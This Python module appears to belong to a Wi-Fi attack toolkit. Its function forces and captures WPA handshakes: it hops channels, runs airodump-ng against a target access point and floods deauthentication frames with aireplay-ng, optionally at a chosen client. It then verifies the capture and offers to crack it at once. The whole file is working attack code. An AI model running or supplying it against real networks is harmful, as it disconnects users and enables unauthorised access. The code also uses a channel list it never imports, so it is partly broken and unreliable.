#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import subprocess
import time
import os
import shutil
from utils.hardware import interface, hardware_available, adapter_detected, ALL_CHANNELS, CHANNELS_24GHZ_EXTENDED
from utils.interface import enable_monitor_mode, set_channel
from utils.status import print_status, ProgressDisplay, confirm_action
from utils.process import active_processes, add_process, remove_process, is_cancelled, set_cancel_flag
from utils.logger import log_capture
from utils.config import config
from core.crack import try_auto_crack


def capture_handshake(bssid: str, channel: str = None, client_mac: str = None) -> str:
    """Capture 4‑way handshake with deauth and channel hopping."""
    if not hardware_available or not adapter_detected:
        print_status("No USB adapter detected", "error")
        return None

    set_cancel_flag(False)
    print_status(f"Handshake capture: {bssid}", "info")

    mon_iface = enable_monitor_mode(interface)
    if not mon_iface:
        print_status("Monitor mode failed", "error")
        return None

    if channel:
        channels_to_try = [int(channel)]
    else:
        channels_to_try = ALL_CHANNELS if config.get("hardware", {}).get("5ghz_enabled", True) else CHANNELS_24GHZ + CHANNELS_24GHZ_EXTENDED
        print_status(f"Channel hopping: scanning {len(channels_to_try)} channels", "info")
        for ch in CHANNELS_24GHZ_EXTENDED:
            if ch in channels_to_try:
                print_status(f"Channel {ch} may be restricted", "warning")

    for ch in channels_to_try:
        if is_cancelled():
            print_status("Capture cancelled", "warning")
            return None

        print_status(f"Trying channel {ch}", "info")
        if not set_channel(ch):
            continue

        output_base = f"/tmp/handshake_{os.environ.get('SESSION_ID', 'unknown')}_ch{ch}"
        dump_cmd = ["airodump-ng", "-c", str(ch), "--bssid", bssid, "-w", output_base, mon_iface]
        dump_proc = subprocess.Popen(dump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        add_process(dump_proc)

        time.sleep(3)

        print_status("Sending deauth frames...", "info")
        deauth_cmd = ["aireplay-ng", "-0", str(config.get("hardware", {}).get("deauth_count", 10)), "-a", bssid]
        if client_mac:
            deauth_cmd.extend(["-c", client_mac])
            print_status(f"Targeting client: {client_mac}", "info")
        deauth_cmd.append(mon_iface)
        deauth_proc = subprocess.Popen(deauth_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        add_process(deauth_proc)

        timeout = config.get("hardware", {}).get("handshake_timeout", 35)
        progress = ProgressDisplay()
        progress.start(f"Waiting for handshake on ch{ch}", timeout)

        for i in range(timeout):
            if is_cancelled():
                progress.stop()
                print_status("Cancelled", "warning")
                dump_proc.terminate()
                deauth_proc.terminate()
                remove_process(dump_proc)
                remove_process(deauth_proc)
                return None

            time.sleep(1)
            progress.update(i + 1)

            cap_file = f"{output_base}-01.cap"
            if os.path.exists(cap_file) and os.path.getsize(cap_file) > 1024:
                verify = subprocess.run(["aircrack-ng", cap_file, "-q"], capture_output=True, text=True)
                if verify and "1 handshake" in verify.stdout:
                    progress.stop()
                    print_status(f"Handshake captured on channel {ch}!", "success")
                    dump_proc.terminate()
                    deauth_proc.terminate()
                    time.sleep(1)

                    dest = f"/tmp/handshake_{bssid.replace(':', '')}.cap"
                    shutil.copy(cap_file, dest)
                    log_capture("handshake", bssid, "", dest)
                    print_status(f"Handshake saved: {dest}", "success")
                    if config.get("cracking", {}).get("auto_crack_after_capture", True) and confirm_action("Crack now?"):
                        try_auto_crack(dest, "handshake")
                    remove_process(dump_proc)
                    remove_process(deauth_proc)
                    return dest

        progress.stop()
        dump_proc.terminate()
        deauth_proc.terminate()
        remove_process(dump_proc)
        remove_process(deauth_proc)
        time.sleep(2)

    print_status("Handshake capture failed on all channels", "error")
    return None
